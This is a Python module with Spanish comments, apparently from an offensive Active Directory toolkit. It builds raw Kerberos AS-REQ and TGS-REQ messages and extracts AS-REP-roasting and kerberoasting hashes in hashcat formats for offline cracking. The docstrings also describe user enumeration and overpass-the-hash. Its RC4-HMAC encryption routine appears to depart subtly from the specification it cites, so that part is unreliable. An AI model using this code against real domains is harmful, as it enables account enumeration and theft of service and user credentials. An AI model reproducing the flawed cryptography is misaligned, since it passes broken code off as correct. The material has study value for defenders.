# core/asn1_helpers.py
#
# Construcción de mensajes Kerberos como bytes DER puros.
#
# ¿Por qué DER manual y no pyasn1?
#   pyasn1 tiene una API de tagset implícito que requiere que los valores ya
#   lleven el tag correcto ANTES de asignarse al Sequence padre, lo que hace
#   que el código de construcción sea más sobre "convencer a pyasn1" que sobre
#   entender el protocolo. Aquí hacemos DER directamente: ves exactamente qué
#   bytes salen al cable y por qué.
#
# Lectura en paralelo recomendada: RFC 4120 §5 + RFC 5652 (DER encoding).
#
# Organización:
#   1. Constantes del protocolo Kerberos
#   2. Primitivas DER (der_integer, der_sequence, der_context_explicit, ...)
#   3. Funciones de construcción de mensajes (build_as_req, build_tgs_req)
#   4. Funciones de parseo de respuestas (parse_krb_error, parse_as_rep_hash)
#   5. Crypto helpers (nt_hash, rc4_hmac_encrypt, build_enc_timestamp)

import hashlib
import hmac
import struct
import os
from datetime import datetime, timezone, timedelta

# ============================================================
# 1. CONSTANTES DEL PROTOCOLO
# ============================================================

PVNO = 5

# msg-type (RFC 4120 §7.5.7)
KRB_AS_REQ  = 10
KRB_AS_REP  = 11
KRB_TGS_REQ = 12
KRB_TGS_REP = 13
KRB_AP_REQ  = 14
KRB_AP_REP  = 15
KRB_ERROR   = 30

# name-type
KRB_NT_UNKNOWN   = 0
KRB_NT_PRINCIPAL = 1
KRB_NT_SRV_INST  = 2
KRB_NT_ENTERPRISE = 10

# pa-type
PA_TGS_REQ       = 1
PA_ENC_TIMESTAMP = 2
PA_ETYPE_INFO2   = 19

# Encryption types
ETYPE_RC4_HMAC            = 23
ETYPE_AES128              = 17
ETYPE_AES256              = 18

# KDC option flags (bitmask 32 bits big-endian, bit 0 = MSB)
KDC_OPT_FORWARDABLE  = 0x40000000
KDC_OPT_RENEWABLE    = 0x00800000
KDC_OPT_CANONICALIZE = 0x00010000
KDC_OPT_RENEWABLE_OK = 0x00000010

# Error codes
KDC_ERR_NONE                = 0
KDC_ERR_C_PRINCIPAL_UNKNOWN = 6    # usuario NO existe
KDC_ERR_PREAUTH_FAILED      = 24   # contraseña mala
KDC_ERR_PREAUTH_REQUIRED    = 25   # usuario SÍ existe, falta pre-auth
KRB_ERR_RESPONSE_TOO_BIG    = 52

# Tags DER de APPLICATION para los mensajes Kerberos
# APPLICATION n = 0x60 | n  (class=01, constructed=1 → 0x60 base)
APP_TAG = {
    KRB_AS_REQ:  0x6a,   # 01 101010
    KRB_AS_REP:  0x6b,   # 01 101011
    KRB_TGS_REQ: 0x6c,   # 01 101100
    KRB_TGS_REP: 0x6d,   # 01 101101
    KRB_ERROR:   0x7e,   # 01 111110
}

# ============================================================
# 2. PRIMITIVAS DER
#
# En DER cada campo es:  [tag] [length] [value]
#
# length:
#   - 0x00..0x7f: 1 byte, longitud directa
#   - 0x81 NN: 2 bytes, longitud en el siguiente byte
#   - 0x82 NN MM: 3 bytes, longitud en los dos siguientes bytes
# ============================================================

def _der_length(n: int) -> bytes:
    """Codifica una longitud DER."""
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    elif n < 0x10000:
        return bytes([0x82, n >> 8, n & 0xff])
    else:
        raise ValueError(f"Longitud DER demasiado grande: {n}")


def _tlv(tag_byte: int, value: bytes) -> bytes:
    """Construye un TLV (Tag-Length-Value) DER."""
    return bytes([tag_byte]) + _der_length(len(value)) + value


def der_integer(n: int) -> bytes:
    """
    INTEGER DER (tag 0x02).
    Kerberos los usa para pvno, msg-type, name-type, etype, error-code, etc.

    Ejemplo: 5 → 02 01 05
             10 → 02 01 0a
    """
    if n == 0:
        return b'\x02\x01\x00'
    result = []
    neg = n < 0
    n_abs = abs(n)
    while n_abs:
        result.append(n_abs & 0xff)
        n_abs >>= 8
    result.reverse()
    # Bit de signo: si el primer byte tiene el bit 7 activo en un número positivo,
    # hay que añadir un 0x00 delante para que no se interprete como negativo
    if not neg and result[0] & 0x80:
        result.insert(0, 0x00)
    return _tlv(0x02, bytes(result))


def der_octet_string(data: bytes) -> bytes:
    """OCTET STRING DER (tag 0x04). Para cipher, nonces, e-data..."""
    return _tlv(0x04, data)


def der_general_string(s: str) -> bytes:
    """
    GeneralString DER (tag 0x1b).
    Kerberos lo usa para KerberosString: realm, nombres de principal, etc.

    Los DCs de Windows aceptan ASCII/UTF-8 aquí aunque la RFC diga IA5.
    """
    return _tlv(0x1b, s.encode('ascii'))


def der_generalized_time(dt: datetime = None) -> bytes:
    """
    GeneralizedTime DER (tag 0x18) — KerberosTime.
    Formato: 'YYYYMMDDHHmmssZ' (siempre UTC, sin fracciones de segundo).

    Ejemplo: '20240315120000Z' → 18 0f 32 30 32 34 30 33 31 35 31 32 30 30 30 30 5a
    """
    if dt is None:
        dt = datetime.now(timezone.utc)
    s = dt.strftime('%Y%m%d%H%M%SZ')
    return _tlv(0x18, s.encode('ascii'))


def der_bit_string(value: int, num_bits: int = 32) -> bytes:
    """
    BIT STRING DER (tag 0x03) — usado para KDCOptions (32 bits de flags).

    El primer byte del value codificado indica cuántos bits del último byte
    son "de relleno" (unused bits). Para 32 bits exactos: 0 bits de relleno.

    Ejemplo: flags=0x40800010 (FORWARDABLE|RENEWABLE|RENEWABLE_OK) →
        03 05 00 40 80 00 10
              ^^ = 0 unused bits
    """
    n_bytes = (num_bits + 7) // 8
    flag_bytes = value.to_bytes(n_bytes, 'big')
    unused = (n_bytes * 8) - num_bits
    return _tlv(0x03, bytes([unused]) + flag_bytes)


def der_sequence(fields: list) -> bytes:
    """
    SEQUENCE DER (tag 0x30) — agrupa varios campos.
    fields: lista de bytes ya codificados en DER.
    """
    body = b''.join(fields)
    return _tlv(0x30, body)


def der_sequence_of(items: list) -> bytes:
    """SEQUENCE OF DER — igual que SEQUENCE pero semánticamente homogéneo."""
    return der_sequence(items)


def ctx_primitive(n: int, value: bytes) -> bytes:
    """
    Context-specific EXPLICIT primitive tag [n] (clase 10, constructed=1).
    Se usa para todos los campos de Kerberos: [0], [1], [2], ...

    En Kerberos los campos son EXPLICIT context tags, lo que significa que
    el tag de contexto envuelve el tag original del tipo (IMPLICIT lo sustituiría).

    Ejemplo: [0] INTEGER 5 →
        a0 03         ← context [0] constructed, longitud 3
          02 01 05    ← INTEGER 5

    tag_byte = 0xa0 | n  (10 100000 | n)
    """
    tag_byte = 0xa0 | n
    return _tlv(tag_byte, value)


def ctx_constructed(n: int, value: bytes) -> bytes:
    """Alias de ctx_primitive — mismo resultado, nombre más semántico para SEQUENCE anidados."""
    return ctx_primitive(n, value)


def application_tag(msg_type: int, body: bytes) -> bytes:
    """
    APPLICATION tag para un mensaje Kerberos completo.
    tag_byte = APP_TAG[msg_type] (ver tabla arriba).

    El resultado es el mensaje listo para enviar por el socket.
    """
    return _tlv(APP_TAG[msg_type], body)


# ============================================================
# 3. CONSTRUCCIÓN DE MENSAJES
# ============================================================

def random_nonce() -> int:
    """Nonce aleatorio de 31 bits (para que quepa en Int32 positivo)."""
    return struct.unpack(">I", os.urandom(4))[0] & 0x7FFFFFFF


def build_principal_name(name_type: int, *components: str) -> bytes:
    """
    PrincipalName ::= SEQUENCE {
        name-type   [0] Int32,
        name-string [1] SEQUENCE OF GeneralString
    }

    Ejemplos:
        Usuario: build_principal_name(1, "jsmith")
        Servicio TGT: build_principal_name(2, "krbtgt", "CORP.LOCAL")
        CIFS: build_principal_name(2, "cifs", "SERVER01.corp.local")
    """
    name_strings = der_sequence_of([der_general_string(c) for c in components])
    return der_sequence([
        ctx_primitive(0, der_integer(name_type)),
        ctx_constructed(1, name_strings),
    ])


def build_pa_data(pa_type: int, pa_value: bytes) -> bytes:
    """
    PA-DATA ::= SEQUENCE {
        padata-type  [1] Int32,
        padata-value [2] OCTET STRING
    }

    Nota: los índices de contexto son [1] y [2], no [0] y [1].
    Es una rareza del RFC 4120 que confunde a menudo.
    """
    return der_sequence([
        ctx_primitive(1, der_integer(pa_type)),
        ctx_primitive(2, der_octet_string(pa_value)),
    ])


def build_as_req(
    username: str,
    realm: str,
    etypes: list = None,
    pa_data_list: list = None,
) -> bytes:
    """
    Construye un AS-REQ completo listo para enviar al KDC.

    AS-REQ ::= [APPLICATION 10] KDC-REQ

    KDC-REQ ::= SEQUENCE {
        pvno     [1] INTEGER (5),
        msg-type [2] INTEGER (10),          ← 10 = KRB_AS_REQ
        padata   [3] SEQUENCE OF PA-DATA OPTIONAL,
        req-body [4] KDC-REQ-BODY
    }

    KDC-REQ-BODY ::= SEQUENCE {
        kdc-options [0] BIT STRING,
        cname       [1] PrincipalName,
        realm       [2] GeneralString,
        sname       [3] PrincipalName,      ← siempre krbtgt/<realm>
        till        [5] GeneralizedTime,
        nonce       [7] INTEGER,
        etype       [8] SEQUENCE OF INTEGER
    }

    Para user_enum / asrep_roasting: pa_data_list=None (sin pre-auth).
    Para overpass-the-hash / login normal: pa_data_list=[build_pa_data(PA_ENC_TIMESTAMP, ...)].

    etypes=None → usa [18, 17, 23] (AES256, AES128, RC4) — orden de preferencia estándar.

    Devuelve bytes DER listos para send_krb_message().
    """
    if etypes is None:
        etypes = [ETYPE_AES256, ETYPE_AES128, ETYPE_RC4_HMAC]

    realm_upper = realm.upper()
    till = datetime.now(timezone.utc) + timedelta(days=1)

    # KDC-REQ-BODY
    req_body_fields = [
        ctx_primitive(0, der_bit_string(
            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE
        )),
        ctx_constructed(1, build_principal_name(KRB_NT_PRINCIPAL, username)),
        ctx_primitive(2, der_general_string(realm_upper)),
        ctx_constructed(3, build_principal_name(KRB_NT_SRV_INST, 'krbtgt', realm_upper)),
        ctx_primitive(5, der_generalized_time(till)),
        ctx_primitive(7, der_integer(random_nonce())),
        ctx_constructed(8, der_sequence_of([der_integer(e) for e in etypes])),
    ]
    req_body = der_sequence(req_body_fields)

    # KDC-REQ
    req_fields = [
        ctx_primitive(1, der_integer(PVNO)),
        ctx_primitive(2, der_integer(KRB_AS_REQ)),
    ]
    if pa_data_list:
        pa_seq = der_sequence_of(pa_data_list)
        req_fields.append(ctx_constructed(3, pa_seq))
    req_fields.append(ctx_constructed(4, req_body))

    inner_seq = der_sequence(req_fields)

    # APPLICATION 10 wrapper
    return application_tag(KRB_AS_REQ, inner_seq)


def build_tgs_req(
    realm: str,
    tgt_bytes: bytes,
    session_key: bytes,
    username: str,
    spn_service: str,
    spn_host: str,
    etypes: list = None,
    session_key_etype: int = ETYPE_RC4_HMAC,
) -> bytes:
    """
    Construye un TGS-REQ para solicitar un ticket para un SPN concreto.

    TGS-REQ ::= [APPLICATION 12] KDC-REQ

    El TGT va dentro de un PA-TGS-REQ (padata type 1), que contiene un AP-REQ
    (APPLICATION 14) con el TGT y un Authenticator cifrado con la session key.

    Esta función es el núcleo de kerberoasting: la respuesta del KDC (TGS-REP)
    contiene el ticket cifrado con el hash del servicio, que podemos crackear offline.

    spn_service: ej. "cifs", "http", "MSSQLSvc"
    spn_host: ej. "SERVER01.corp.local" o "SERVER01.corp.local:1433"
    """
    if etypes is None:
        etypes = [ETYPE_AES256, ETYPE_AES128, ETYPE_RC4_HMAC]

    realm_upper = realm.upper()

    # Authenticator (versión simplificada para TGS-REQ — RFC 4120 §5.5.1)
    # Authenticator ::= [APPLICATION 2] SEQUENCE {
    #     authenticator-vno [0] INTEGER (5),
    #     crealm            [1] Realm,
    #     cname             [2] PrincipalName,
    #     cusec             [4] Microseconds,
    #     ctime             [5] KerberosTime,
    # }
    now = datetime.now(timezone.utc)
    microsec = now.microsecond

    auth_body = der_sequence([
        ctx_primitive(0, der_integer(PVNO)),
        ctx_primitive(1, der_general_string(realm_upper)),
        ctx_constructed(2, build_principal_name(KRB_NT_PRINCIPAL, username)),
        ctx_primitive(4, der_integer(microsec)),
        ctx_primitive(5, der_generalized_time(now)),
    ])
    authenticator_raw = application_tag(2, auth_body)

    # Ciframos el Authenticator con la session key (RC4-HMAC)
    enc_auth = rc4_hmac_encrypt(session_key, authenticator_raw, key_usage=7)

    # EncryptedData del Authenticator
    enc_auth_der = der_sequence([
        ctx_primitive(0, der_integer(session_key_etype)),
        ctx_primitive(2, der_octet_string(enc_auth)),
    ])

    # AP-REQ = APPLICATION 14
    ap_req_body = der_sequence([
        ctx_primitive(0, der_integer(PVNO)),
        ctx_primitive(1, der_integer(KRB_AP_REQ)),
        ctx_primitive(2, der_bit_string(0)),       # ap-options: ninguno
        ctx_constructed(3, tgt_bytes),             # el TGT (Ticket raw)
        ctx_constructed(4, enc_auth_der),          # Authenticator cifrado
    ])
    ap_req = application_tag(KRB_AP_REQ, ap_req_body)

    # PA-TGS-REQ wraps the AP-REQ
    pa_tgs = build_pa_data(PA_TGS_REQ, ap_req)

    till = datetime.now(timezone.utc) + timedelta(days=1)

    # KDC-REQ-BODY (sin cname en TGS-REQ — la identidad ya va en el TGT)
    req_body_fields = [
        ctx_primitive(0, der_bit_string(KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE)),
        ctx_primitive(2, der_general_string(realm_upper)),
        ctx_constructed(3, build_principal_name(KRB_NT_SRV_INST, spn_service, spn_host)),
        ctx_primitive(5, der_generalized_time(till)),
        ctx_primitive(7, der_integer(random_nonce())),
        ctx_constructed(8, der_sequence_of([der_integer(e) for e in etypes])),
    ]
    req_body = der_sequence(req_body_fields)

    req_fields = [
        ctx_primitive(1, der_integer(PVNO)),
        ctx_primitive(2, der_integer(KRB_TGS_REQ)),
        ctx_constructed(3, der_sequence_of([pa_tgs])),
        ctx_constructed(4, req_body),
    ]
    inner_seq = der_sequence(req_fields)
    return application_tag(KRB_TGS_REQ, inner_seq)


# ============================================================
# 4. PARSEO DE RESPUESTAS DEL KDC
# ============================================================

def is_krb_error(data: bytes) -> bool:
    return bool(data) and data[0] == APP_TAG[KRB_ERROR]


def is_as_rep(data: bytes) -> bool:
    return bool(data) and data[0] == APP_TAG[KRB_AS_REP]


def is_tgs_rep(data: bytes) -> bool:
    return bool(data) and data[0] == APP_TAG[KRB_TGS_REP]


def _der_parse_tlv(data: bytes, pos: int):
    """
    Parser DER mínimo: extrae (tag, value_bytes, next_pos) a partir de 'pos'.
    Solo soporta tags de 1 byte y longitudes de hasta 3 bytes (suficiente para Kerberos).
    """
    tag_byte = data[pos]; pos += 1
    first_len = data[pos]; pos += 1

    if first_len & 0x80 == 0:
        length = first_len
    elif first_len == 0x81:
        length = data[pos]; pos += 1
    elif first_len == 0x82:
        length = (data[pos] << 8) | data[pos+1]; pos += 2
    else:
        raise ValueError(f"Longitud DER no soportada: 0x{first_len:02x}")

    return tag_byte, data[pos:pos+length], pos + length


def _parse_integer(data: bytes) -> int:
    """Decodifica un INTEGER DER a int Python."""
    result = 0
    for b in data:
        result = (result << 8) | b
    # Signo: si el primer bit está a 1, es negativo
    if data and data[0] & 0x80:
        result -= (1 << (len(data) * 8))
    return result


def parse_krb_error(data: bytes) -> dict:
    """
    Parsea KRB-ERROR y devuelve un dict con los campos relevantes.
    Usa el parser DER mínimo (sin pyasn1) para coherencia con el encoder.

    Campos retornados:
        error_code (int), error_name (str), e_text (str|None), e_data (bytes|None)
    """
    ERROR_NAMES = {
        6:  'KDC_ERR_C_PRINCIPAL_UNKNOWN',   # usuario no existe
        24: 'KDC_ERR_PREAUTH_FAILED',
        25: 'KDC_ERR_PREAUTH_REQUIRED',      # usuario existe, falta preauth
        37: 'KRB_AP_ERR_SKEW',
        52: 'KRB_ERR_RESPONSE_TOO_BIG',
    }

    if not is_krb_error(data):
        raise ValueError(f"No es KRB-ERROR (tag=0x{data[0]:02x})")

    # Quitamos el APPLICATION wrapper y el SEQUENCE exterior
    _, inner, _ = _der_parse_tlv(data, 0)    # APPLICATION 30
    _, seq_body, _ = _der_parse_tlv(inner, 0) # SEQUENCE

    # Iteramos los campos context-tagged
    error_code = None
    e_text = None
    e_data = None
    pos = 0
    while pos < len(seq_body):
        ctx_tag, field_data, pos = _der_parse_tlv(seq_body, pos)
        field_id = ctx_tag & 0x1f   # los 5 bits bajos = número de campo

        if field_id == 6:   # error-code [6]
            _, int_bytes, _ = _der_parse_tlv(field_data, 0)
            error_code = _parse_integer(int_bytes)
        elif field_id == 11: # e-text [11]
            _, str_bytes, _ = _der_parse_tlv(field_data, 0)
            e_text = str_bytes.decode('ascii', errors='replace')
        elif field_id == 12: # e-data [12]
            _, oct_bytes, _ = _der_parse_tlv(field_data, 0)
            e_data = oct_bytes

    return {
        'error_code': error_code,
        'error_name': ERROR_NAMES.get(error_code, f'ERROR_{error_code}'),
        'e_text': e_text,
        'e_data': e_data,
    }


def extract_asrep_hash(as_rep_data: bytes, username: str, realm: str) -> str:
    """
    Extrae el hash de un AS-REP en formato hashcat modo 18200 ($krb5asrep$).

    En AS-REP Roasting: el KDC devuelve un AS-REP para una cuenta con
    DONT_REQUIRE_PREAUTH. La parte encryptedData.cipher (tag [2] del campo
    enc-part [6]) está cifrada con el hash del usuario → crackeable offline.

    Formato hashcat 18200:
        $krb5asrep$23$usuario@REALM$<primeros16bytes_como_hex>$<resto>

    El tag [6] del AS-REP contiene el EncryptedData del enc-part:
        enc-part [6] EncryptedData → { etype [0], kvno [1]?, cipher [2] }
    """
    if not is_as_rep(as_rep_data):
        raise ValueError(f"No es AS-REP (tag=0x{as_rep_data[0]:02x})")

    _, inner, _ = _der_parse_tlv(as_rep_data, 0)   # APPLICATION 11
    _, seq_body, _ = _der_parse_tlv(inner, 0)       # SEQUENCE

    enc_part_data = None
    etype = None
    pos = 0
    while pos < len(seq_body):
        ctx_tag, field_data, pos = _der_parse_tlv(seq_body, pos)
        field_id = ctx_tag & 0x1f
        if field_id == 6:   # enc-part [6]
            enc_part_data = field_data
            break

    if enc_part_data is None:
        raise ValueError("No se encontró enc-part [6] en el AS-REP")

    # Dentro de enc-part: SEQUENCE { etype [0], kvno [1]?, cipher [2] }
    _, enc_seq, _ = _der_parse_tlv(enc_part_data, 0)
    cipher_bytes = None
    pos = 0
    while pos < len(enc_seq):
        ctx_tag, field_data, pos = _der_parse_tlv(enc_seq, pos)
        field_id = ctx_tag & 0x1f
        if field_id == 0:   # etype [0]
            _, int_bytes, _ = _der_parse_tlv(field_data, 0)
            etype = _parse_integer(int_bytes)
        elif field_id == 2: # cipher [2]
            _, oct_bytes, _ = _der_parse_tlv(field_data, 0)
            cipher_bytes = oct_bytes

    if cipher_bytes is None:
        raise ValueError("No se encontró cipher [2] en enc-part")

    # Formato hashcat 18200: primeros 16 bytes = checksum, resto = ciphertext
    checksum = cipher_bytes[:16].hex()
    ciphertext = cipher_bytes[16:].hex()
    realm_upper = realm.upper()

    return f"$krb5asrep${etype}${username}@{realm_upper}${checksum}${ciphertext}"


def extract_tgsrep_hash(tgs_rep_data: bytes, username: str, realm: str, spn: str) -> str:
    """
    Extrae el hash del TGS-REP en formato hashcat modo 13100 ($krb5tgs$).

    En Kerberoasting: el ticket (enc-part del Ticket) está cifrado con el
    hash del servicio (la cuenta que tiene ese SPN). El TGS-REP contiene:
        ticket [3] Ticket → { enc-part [3] EncryptedData }

    El enc-part del Ticket es lo crackeable, no el enc-part del TGS-REP
    (que está cifrado con la session key del usuario).

    Formato hashcat 13100:
        $krb5tgs$23$*usuario$REALM$spn*$<primeros16>$<resto>
    """
    if not is_tgs_rep(tgs_rep_data):
        raise ValueError(f"No es TGS-REP (tag=0x{tgs_rep_data[0]:02x})")

    _, inner, _ = _der_parse_tlv(tgs_rep_data, 0)
    _, seq_body, _ = _der_parse_tlv(inner, 0)

    ticket_data = None
    pos = 0
    while pos < len(seq_body):
        ctx_tag, field_data, pos = _der_parse_tlv(seq_body, pos)
        field_id = ctx_tag & 0x1f
        if field_id == 3:   # ticket [3]
            ticket_data = field_data
            break

    if ticket_data is None:
        raise ValueError("No se encontró ticket [3] en el TGS-REP")

    # Ticket ::= [APPLICATION 1] SEQUENCE {
    #     tkt-vno [0], realm [1], sname [2], enc-part [3] EncryptedData }
    _, ticket_app, _ = _der_parse_tlv(ticket_data, 0)  # APPLICATION 1
    _, ticket_seq, _ = _der_parse_tlv(ticket_app, 0)

    enc_part_data = None
    etype = None
    pos = 0
    while pos < len(ticket_seq):
        ctx_tag, field_data, pos = _der_parse_tlv(ticket_seq, pos)
        field_id = ctx_tag & 0x1f
        if field_id == 3:   # enc-part [3] del Ticket
            enc_part_data = field_data
            break

    if enc_part_data is None:
        raise ValueError("No se encontró enc-part [3] en el Ticket")

    _, enc_seq, _ = _der_parse_tlv(enc_part_data, 0)
    cipher_bytes = None
    pos = 0
    while pos < len(enc_seq):
        ctx_tag, field_data, pos = _der_parse_tlv(enc_seq, pos)
        field_id = ctx_tag & 0x1f
        if field_id == 0:
            _, int_bytes, _ = _der_parse_tlv(field_data, 0)
            etype = _parse_integer(int_bytes)
        elif field_id == 2:
            _, oct_bytes, _ = _der_parse_tlv(field_data, 0)
            cipher_bytes = oct_bytes

    if cipher_bytes is None:
        raise ValueError("No se encontró cipher [2] en enc-part del Ticket")

    checksum = cipher_bytes[:16].hex()
    ciphertext = cipher_bytes[16:].hex()
    realm_upper = realm.upper()

    return f"$krb5tgs${etype}$*{username}${realm_upper}${spn}*${checksum}${ciphertext}"


# ============================================================
# 5. CRYPTO HELPERS
# ============================================================

def nt_hash(password: str) -> bytes:
    """
    NT hash = MD4(password.encode('utf-16-le'))
    Es la clave base para RC4-HMAC (etype 23) en Kerberos.
    """
    from Cryptodome.Hash import MD4
    return MD4.new(data=password.encode('utf-16-le')).digest()


def hmac_md5(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.md5).digest()


def rc4(key: bytes, data: bytes) -> bytes:
    """RC4 puro — para RC4-HMAC (etype 23)."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def rc4_hmac_encrypt(key: bytes, plaintext: bytes, key_usage: int = 7) -> bytes:
    """
    RC4-HMAC encryption (etype 23) según MS-KILE §3.4.5.1.

    Construcción:
        K1 = HMAC-MD5(key, usage_le32 + '\x00\x00\x00\x00')
        K2 = HMAC-MD5(K1, confounder)      ← clave de cifrado
        checksum = HMAC-MD5(K1, confounder + plaintext)
        ciphertext = RC4(K2, checksum + plaintext)

    El resultado es: confounder + ciphertext

    key_usage: el "message type" que diferencia los distintos usos de la clave.
        7 = Authenticator en TGS-REQ
        8 = TGS-REQ body
    """
    confounder = os.urandom(8)
    k1 = hmac_md5(key, struct.pack('<I', key_usage) + b'\x00\x00\x00\x00')
    checksum = hmac_md5(k1, confounder + plaintext)
    k2 = hmac_md5(k1, confounder)
    ciphertext = rc4(k2, checksum + plaintext)
    return confounder + ciphertext


def build_enc_timestamp(password: str) -> bytes:
    """
    Construye el PA-ENC-TIMESTAMP para un AS-REQ con pre-auth RC4-HMAC.

    PA-ENC-TS-ENC ::= SEQUENCE {
        patimestamp [0] KerberosTime,
        pausec      [1] INTEGER OPTIONAL
    }

    El resultado se envuelve en EncryptedData (etype=23) y se pasa a
    build_pa_data(PA_ENC_TIMESTAMP, ...) para incluirlo en el AS-REQ.
    """
    now = datetime.now(timezone.utc)

    # PA-ENC-TS-ENC como bytes DER
    ts_body = der_sequence([
        ctx_primitive(0, der_generalized_time(now)),
        ctx_primitive(1, der_integer(now.microsecond)),
    ])

    key = nt_hash(password)
    ciphertext = rc4_hmac_encrypt(key, ts_body, key_usage=1)

    # EncryptedData: { etype [0], cipher [2] }
    enc_data = der_sequence([
        ctx_primitive(0, der_integer(ETYPE_RC4_HMAC)),
        ctx_primitive(2, der_octet_string(ciphertext)),
    ])
    return enc_data
